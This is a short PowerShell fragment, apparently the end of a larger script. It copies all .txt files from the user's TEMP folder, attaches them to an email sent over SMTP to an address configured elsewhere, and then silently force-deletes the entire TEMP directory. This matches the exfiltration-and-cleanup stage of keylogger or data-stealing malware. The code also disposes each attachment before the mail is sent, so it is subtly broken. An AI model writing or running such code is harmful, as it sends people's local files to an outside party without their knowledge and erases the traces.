
Copy-Item -Path "$env:TEMP\*.txt" -Destination "C:\l\"

$files=Get-ChildItem "C:\l\"

Foreach($file in $files)
{
Write-Host "Attaching File :- " $file
$attachment = New-Object System.Net.Mail.Attachment "C:\l\$file"
$ReportEmail.Attachments.Add($attachment)
$attachment.Dispose()
}

$SMTPInfo.Send($ReportEmail)
Write-host 'Mail Sent Successfully'

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
